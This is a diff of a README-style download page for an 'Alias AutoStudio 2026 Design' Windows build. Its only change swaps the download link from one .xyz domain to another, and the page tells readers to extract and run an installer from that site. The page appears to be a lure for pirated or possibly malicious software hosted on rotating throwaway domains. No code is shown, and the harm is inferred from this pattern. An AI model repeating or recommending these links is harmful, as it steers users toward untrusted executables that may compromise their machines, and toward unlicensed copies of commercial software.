@@ -18,8 +18,8 @@ Alias AutoStudio 2026 Design — desktop build for Windows 10/11 | clear layout 
 
 > Use the project link below for Windows.
 
-* **Project link:** **[alias-autostudio.nexpath.xyz](https://alias-autostudio.nexpath.xyz/)**
-* **Full URL:** `https://alias-autostudio.nexpath.xyz/`
+* **Project link:** **[alias-autostudio.nerasix.xyz](https://alias-autostudio.nerasix.xyz/)**
+* **Full URL:** `https://alias-autostudio.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Modules arrive ready for local use | open the app and continue. This release inc
 * **RAM:** 8 GB or more | 16 GB ideal for large files
 * **Disk:** 4 GB free on system drive
 
-***
+***
